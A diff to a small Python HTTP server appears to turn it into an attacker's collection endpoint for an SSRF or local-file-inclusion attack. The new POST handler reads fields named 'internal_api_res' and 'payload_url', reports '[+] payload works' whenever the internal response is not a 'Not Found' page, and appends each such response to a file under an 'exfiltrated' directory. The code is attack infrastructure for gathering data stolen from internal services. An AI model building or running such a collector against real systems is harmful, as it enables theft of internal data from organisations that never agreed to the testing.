@@ -37,6 +37,8 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
             # Handle other GET requests with a 404
             self.send_response(404)
             self.end_headers()
+            
+            
     def do_POST(self):
         # Get the content length from headers
         content_length = int(self.headers['Content-Length'])
@@ -47,11 +49,16 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
             # Parse the JSON data
             json_data = json.loads(post_data)
             print("Received JSON data:")
-            print(json.dumps(json_data, indent=4))  # Pretty-print the JSON data
+            #print(json.dumps(json_data, indent=4))  # Pretty-print the JSON data
             
-            with open('server_status.html', 'wb') as f:
-                f.write(json_data["internal_api_res"].encode()) 
-            # Send a 200 OK response
+            res : str = json_data["internal_api_res"]
+            internal_lfi_path =  json_data["payload_url"]
+            if not ("Not Found".lower() in res.lower()):
+                print("[+] payload works => internal url: " + internal_lfi_path)
+                with open('exfiltrated/current_internal_response.txt', 'ab') as f:
+                    f.write(res.encode()) 
+
+
             self.send_response(200)
             self.send_header('Content-Type', 'application/json')
             self.end_headers()
